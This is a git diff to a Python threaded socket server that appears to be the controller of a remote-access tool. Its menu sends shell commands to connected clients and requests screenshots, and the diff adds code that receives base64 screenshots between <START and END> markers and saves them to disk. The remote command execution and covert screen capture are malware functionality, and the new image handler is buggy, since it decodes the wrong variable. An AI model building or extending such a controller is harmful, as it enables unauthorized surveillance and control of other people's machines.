@@ -1,6 +1,8 @@
 import socketserver
 import threading
 import re
+import base64
+from datetime import datetime
 
 # SockerServer example used at https://docs.python.org/3/library/socketserver.html
 # Threads is used to run multiple I/O-bound tasks simultaneously, here, requests
@@ -36,16 +38,32 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
                 header = self.request.recv(HEADER_LENGTH).strip()
                 data_size = int.from_bytes(header, 'little')
 
-                # if data_size == 8192: # Assume for now it's img, RFT : check for <START balise 
+                if data_size == 8192: # Assume for now it's img - Refactor : check for <START balise 
+                    deliminer_found = False
+                    img = b''
+                    while not deliminer_found :
+                        packet : str = self.request.recv(data_size).strip().decode('utf-8')
+                        start_check = packet.startswith('<START')
+                        deliminer_found = packet.endswith('END>')
+                        if deliminer_found :
+                            packet = packet.removesuffix('END>')
+                        if start_check:
+                            packet =  packet.removeprefix('<START')
+                        img += packet.encode('utf-8')
+                        
+                        b64_to_txt(img) # DEBUG
 
+                    with open('./screenshots/SAVED.jpg', 'wb') as fs:
+                        fs.write(base64.decodebytes(self.data))
 
-                self.data = self.request.recv(data_size).strip()
-                message = self.data.decode('utf-8')
-                print(f'{self.client_address} > ' + message)
+                else :
+                    self.data = self.request.recv(data_size).strip()
+                    message = self.data.decode('utf-8')
+                    print(f'{self.client_address} > ' + message)
 
-                # send alive ping back
-                if (message == 'First connection ping'):
-                    self.request.sendall(b'Alive ping back received')
+                    # send alive ping back
+                    if (message == 'First connection ping'):
+                        self.request.sendall(b'Alive ping back received')
                 
         except ConnectionAbortedError :
             print('Connection was aborted by the local system')
@@ -95,6 +113,8 @@ def central_commands():
                 get_SC(msg)
             elif menu_option == 'shell':
                 send_shell(msg)
+            elif menu_option == '':
+                pass
             else :
                 print('Command not recognized')
 
@@ -164,7 +184,9 @@ def send_shell(msg: str):
     client_socket.sendall(command.encode('utf-8')) 
     # The Data back is caught by the open loop Handler
 
-
+def b64_to_txt(b64):
+    with open('img_b64_server.txt', 'wb') as fs:
+        fs.write(b64)
 
 if __name__ == '__main__':
     HOST, PORT = 'localhost', 5000
